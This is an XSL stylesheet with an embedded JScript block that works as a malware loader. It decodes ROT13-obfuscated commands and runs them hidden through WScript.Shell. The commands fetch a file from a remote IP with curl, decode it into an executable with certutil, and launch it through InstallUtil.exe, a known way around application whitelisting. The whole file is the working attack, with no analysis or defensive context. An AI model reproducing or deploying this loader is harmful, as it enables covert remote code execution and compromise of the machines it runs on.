<?xml version='1.0' ?>
<stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
  <output method="text" />
  <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split("");
            var ralph = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm".split("");

            function decrypt(enc) {
            enc = enc.split("");
            for (var x = 0; x < enc.length; x++) {
              for (var y = 0; y < alph.length; y++) {
                if (enc[x] == alph[y]) {
                  enc[x] = ralph[y];
                  break;
                }
              }
            }
            return enc.join("");
            }

            cmd1 = decrypt("pzq /p qry P:\\Jvaqbjf\\Gnfxf\\znva.*");
            cmd2 = decrypt("phey uggc://192.168.49.116/znva.gkg -b P:\\Jvaqbjf\\Gnfxf\\znva.gkg");
            cmd3 = decrypt("preghgvy -qrpbqr P:\\Jvaqbjf\\Gnfxf\\znva.gkg P:\\Jvaqbjf\\Gnfxf\\znva.rkr");
            cmd4 = decrypt("P:\\Jvaqbjf\\Zvpebfbsg.ARG\\Senzrjbex64\\i4.0.30319\\VafgnyyHgvy.rkr");
            cmd4 += decrypt(" /ybtsvyr= /YbtGbPbafbyr=snyfr /H P:\\Jvaqbjf\\Gnfxf\\znva.rkr");

            var sh = new ActiveXObject(decrypt("Jfpevcg.furyy"));
            sh.Run(cmd1, 0, true);
            sh.Run(cmd2, 0, true);
            sh.Run(cmd3, 0, true);
            sh.Run(cmd4, 0, true);
        ]]>
    </ms:script>
</stylesheet>
